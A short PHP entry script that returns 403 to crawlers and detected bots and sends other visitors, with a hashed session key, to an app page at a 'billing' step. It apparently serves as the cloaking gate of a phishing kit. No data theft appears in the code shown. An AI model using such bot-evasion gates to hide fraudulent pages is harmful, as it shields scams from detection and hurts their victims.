<?php

include "./helpers/index.php";
require_once "./config.php";

use Jaybizzle\CrawlerDetect\CrawlerDetect; 
$CrawlerDetect = new CrawlerDetect; 

if ($CrawlerDetect->isCrawler() || IsBot($ip)) { 
    http_response_code(403); 
    die(); 
} else {
    $session_key = sha1($date.$ip);
    $_SESSION['sessionKey'] = $session_key;
    
    // check if the user is already logged in
    if (isset($_SESSION['sessionKey']) && isset($_SESSION['op'])) {
        header("Location: ./".APP."?session_key=".$_SESSION['sessionKey']."&op=".$_SESSION['op']);
        exit;
    }

    $op = "billing";
    $_SESSION['op'] = $op;
    header("Location: ./".APP."?session_key=".$_SESSION['sessionKey']."&op=".$_SESSION['op']);
    exit;
}